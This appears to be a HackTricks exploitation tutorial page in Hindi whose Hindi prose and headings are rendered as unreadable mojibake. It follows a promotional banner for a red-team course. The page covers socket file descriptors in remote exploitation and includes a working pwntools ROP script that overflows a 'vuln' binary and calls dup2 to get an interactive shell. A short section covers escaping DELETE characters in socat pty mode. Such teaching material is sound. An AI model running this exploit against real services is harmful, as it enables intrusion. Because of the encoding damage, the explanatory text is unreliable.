# рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд╢рд╛рд╕рди рд╕рдорд╕реНрдпрд╛рдПрдВ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** рдЯреНрд╡рд┐рдЯрд░ рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗ**.

</details>

## рджреВрд░рд╕реНрде рд╢реЛрд╖рдг рдореЗрдВ рдПрдлрдбреАs

рдЬрдм рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ **`system('/bin/sh')`** рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рд░реНрд╡рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛, рдФрд░ `/bin/sh` stdin рд╕реЗ рдЗрдирдкреБрдЯ рдХреА рдЙрдореНрдореАрдж рдХрд░реЗрдЧрд╛ (FD: `0`) рдФрд░ stdout рдФрд░ stderr рдореЗрдВ рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛ (FDs `1` рдФрд░ `2`)ред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рд╢реИрд▓реА рд╕реЗ рд╢реИрд▓ рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

рдЗрд╕реЗ рдареАрдХ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╕рдордЭрд╛ рдЬрд╛рдП рдХрд┐ рдЬрдм рд╕рд░реНрд╡рд░ рд╢реБрд░реВ рд╣реБрдЖ рддреЛ рдпрд╣рдиреЗ **FD рдирдВрдмрд░ `3`** (рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП) рдмрдирд╛рдпрд╛ рдерд╛ рдФрд░ рдлрд┐рд░, рдЖрдкрдХрд╛ рдХрдиреЗрдХреНрд╢рди **FD рдирдВрдмрд░ `4`** рдореЗрдВ рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **`dup2`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ stdin (FD 0) рдФрд░ stdout (FD 1) рдХреЛ FD 4 рдореЗрдВ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдПрдХ) рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ рд╢реИрд▓ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред

[**рдпрд╣рд╛рдБ рд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat рдФрд░ pty

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ socat рдкрд╣рд▓реЗ рд╕реЗ рд╣реА `stdin` рдФрд░ `stdout` рдХреЛ рд╕реЙрдХреЗрдЯ рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░ рджреЗрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, `pty` рдореЛрдб **DELETE рд╡рд░реНрдгреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓** рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк `\x7f` ( `DELETE` -) рднреЗрдЬрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдЖрдкрдХреЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рдкрд┐рдЫрд▓реЗ рд╡рд░реНрдг рдХреЛ **рд╣рдЯрд╛ рджреЗрдЧрд╛**ред

рдЗрд╕реЗ рдЗрд╕рдХреЛ рдЕрдирджрд░ рдЧреБрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рднрд╛рдЧрдиреЗ рд╡рд╛рд▓рд╛ рд╡рд░реНрдг `\x16` рдХрд┐рд╕реА рднреА `\x7f` рдХреЗ рд╕рд╛рде рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред**

**рдпрд╣рд╛рдБ рдЖрдк** [**рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**ред**
